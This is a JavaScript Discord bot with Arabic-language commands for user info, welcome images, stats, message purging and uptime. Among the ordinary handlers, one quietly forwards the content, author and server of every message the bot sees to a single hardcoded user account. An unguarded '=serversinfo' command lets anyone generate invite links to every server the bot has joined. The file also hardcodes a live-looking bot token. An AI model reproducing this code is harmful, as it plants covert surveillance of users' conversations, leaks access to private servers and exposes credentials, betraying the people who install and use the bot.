const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require("fs");
const moment = require('moment');

client.on('ready', () => {
     client.user.setActivity("Y-Bot",{type: 'WATCHING'});

});




    client.on('message', message => {
          if (message.content.startsWith("=id")) {
            if(!message.channel.guild) return message.reply('_هذا الامر للسيرفرات فقط')
    var args = message.content.split(" ").slice(1);
    let user = message.mentions.users.first();
    var men = message.mentions.users.first();
       var heg;
       if(men) {
           heg = men
       } else {
           heg = message.author
       }
     var mentionned = message.mentions.members.first();
        var h;
       if(mentionned) {
           h = mentionned
       } else {
           h = message.member
       }
              moment.locale('ar-TN');
     var id = new  Discord.RichEmbed()
   .setColor("RANDOM")
   .setThumbnail(message.author.avatarURL)
   .setAuthor(` ${message.author.username} `, message.author.avatarURL)
   .addField(': تاريخ دخولك للديسكورد', `${moment(heg.createdTimestamp).format('YYYY/M/D HH:mm')} **\n** \`${moment(heg.createdTimestamp).fromNow()}\`` ,true)
   .addField(': تاريخ دخولك لسيرفرنا', `${moment(h.joinedAt).format('YYYY/M/D HH:mm')} \n \`${moment(h.joinedAt).fromNow()}\``, true)
   .setFooter(`${message.author.username}`, 'https://images-ext-2.discordapp.net/external/JpyzxW2wMRG2874gSTdNTpC_q9AHl8x8V4SMmtRtlVk/https/orcid.org/sites/default/files/files/ID_symbol_B-W_128x128.gif')
   message.channel.send(id)
}       });


client.on('guildMemberAdd', member => {

const channel = member.guild.channels.find("name","welcome")
if (member.user.bot) return;
var Canvas = require('canvas')
var jimp = require('jimp')
const w = ['./img/blue.png'];
        let Image = Canvas.Image,
            canvas = new Canvas(749, 198),
            ctx = canvas.getContext('2d');
        ctx.patternQuality = 'bilinear';
        ctx.filter = 'bilinear';
        ctx.antialias = 'subpixel';
        ctx.shadowColor = 'rgba(0, 0, 0, 0.4)';
        ctx.shadowOffsetY = 2;
        ctx.shadowBlur = 2;
        ctx.stroke();
        ctx.beginPath();

        fs.readFile(`${w[Math.floor(Math.random() * w.length)]}`, function (err, Background) {
            if (err) return console.log(err);
            let BG = Canvas.Image;
            let ground = new Image;
            ground.src = Background;
            ctx.drawImage(ground, 0, 0, 749, 198);

})

                let url = member.user.displayAvatarURL.endsWith(".webp") ? member.user.displayAvatarURL.slice(5, -20) + ".png" : member.user.displayAvatarURL;
                jimp.read(url, (err, ava) => {
                    if (err) return console.log(err);
                    ava.getBuffer(jimp.MIME_PNG, (err, buf) => {
                        if (err) return console.log(err);
ctx.font = '35px Aeland';
                        ctx.fontSize = '40px';
                        ctx.fillStyle = "#FFFFFF";
                        ctx.textAlign = "center";
                        ctx.fillText(" Welcome to " + member.guild.name , 440, 25);

                        //ur name
                        ctx.font = '40px Impact';
                        ctx.fontSize = '48px';
                        ctx.fillStyle = "#FFFFFF";
                        ctx.textAlign = "center";
                        ctx.fillText(member.user.username, 420, 100);
                         ctx.font = '30px Impact';
                        ctx.fontSize = '20px';
                        ctx.fillStyle = "#FFFFFF";
                        ctx.textAlign = "center";
                        ctx.fillText("Member namber :" + member.guild.memberCount, 410, 170);


                        //Avatar
                        let Avatar = Canvas.Image;
                              let ava = new Avatar;
                              ava.src = buf;
                              ctx.beginPath();
                              ctx.arc(115, 100, 90, 0, Math.PI*2);
                                 ctx.closePath();
                                 ctx.clip();
                                 ctx.drawImage(ava, 5, 5, 200, 200);
        channel.sendFile(canvas.toBuffer())



})
})


});



client.on('message', message => {
                var SAMSUNG = new Discord.RichEmbed()
                .addField('** الـسيرفر** : ', `${message.guild.name}`,true)
            .addField(' **الـمرسل ** : ', `${message.author.username}#${message.author.discriminator}`,true)
            .addField(' **المنشن ** : ', `<@${message.author.id}>`,true)
            .addField(' **الرسالة** : ', `${message.content}`)
              .setThumbnail(message.guild.iconURL)
              .setColor('RANDOM')
              client.users.get("388463178377330688").send({embed: SAMSUNG});
})






client.on('message', message => {
    if(message.content === "=bot") {
        const embed = new Discord.RichEmbed()
        .setColor("#00FFFF")
  .addField('**الذاكرة المستخدمة 💾**', `${(process.memoryUsage().rss / 1000000).toFixed()}MB`, true)
         .addField('**سرعة الاتصال📡**' , `${Date.now() - message.createdTimestamp}` + ' ms')
        .addField('**استخدام المعالج💿**', `${(process.cpuUsage().rss / 10000).toFixed()}%`, true)
        .addField('**:globe_with_meridians: عدد السيرفرات**' , `${client.guilds.size}`, true)
        .addField('**عدد المستخدمين 👥 **' , `${client.users.size}`, true)
               message.channel.sendEmbed(embed);
           }
});


client.on("guildCreate", guild => {
    let embed = new Discord.RichEmbed () 
    .setTitle('Bot Logs')
    .addField(' ***Bot joined to :***[' + `${guild.name}` + ']   **By : **' + `${guild.owner.user.username}` + '')
    .setFooter('The bot is happy')
    .setTimestamp()
    client.channels.get("449989746874122251").send(embed)
  });

  client.on("guildDelete", guild => {
  let embed = new Discord.RichEmbed ()
  .setTitle('Bot Logs')
  .addField(' ***Bot left from :***[' + `${guild.name}` + ']     **By : **' + `${guild.owner.user.username}` +  ' ')
  .setFooter('The bot is crying')
  .setTimestamp()
  client.channels.get("286867950466629642").send(embed)
});



var prefix = '=';
client.on('message', message => {
    let args = message.content.split(" ").slice(1);
if (message.content.startsWith(prefix + 'مسح')) {
 let args = message.content.split(" ").slice(1)
    let messagecount = parseInt(args);
    if (args > 100) return message.reply("اعلى حد للمسح هو 100").then(messages => messages.delete(5000))
    if (!messagecount) return message.reply("ااختر كمية المسح من 1-100").then(messages => messages.delete(5000))
    message.channel.fetchMessages({limit: messagecount + 1}).then(messages => message.channel.bulkDelete(messages));
    message.channel.send(`\`${args}\` تم المسح`).then(messages => messages.delete(5000));
  }
  });

client.on('message', message => {
     var prefix = "="
if (message.content.startsWith(prefix + "uptime")) {
    let uptime = client.uptime;

    let days = 0;
    let hours = 0;
    let minutes = 0;
    let seconds = 0;
    let notCompleted = true;

    while (notCompleted) {

        if (uptime >= 8.64e+7) {

            days++;
            uptime -= 8.64e+7;

        } else if (uptime >= 3.6e+6) {

            hours++;
            uptime -= 3.6e+6;

        } else if (uptime >= 60000) {

            minutes++;
            uptime -= 60000;

        } else if (uptime >= 1000) {
            seconds++;
            uptime -= 1000;

        }

        if (uptime < 1000)  notCompleted = false;

    }

    message.channel.send("`" + `${days} days, ${hours} hrs, ${minutes} min , ${seconds} sec` + "`");


}
});



  client.on('message', msg => {
    if(msg.author.bot) return;
    
    if(msg.content === '=serversinfo') {
      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 1,
          maxAge: 86400
        }).then(i => msg.channel.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
    
  })






client.login('NDU0NDAzMDkxMjc0NjYxOTEx.Dfs7Xg.MMNpCRzYqJSid02r0pEnWAeR_v0');
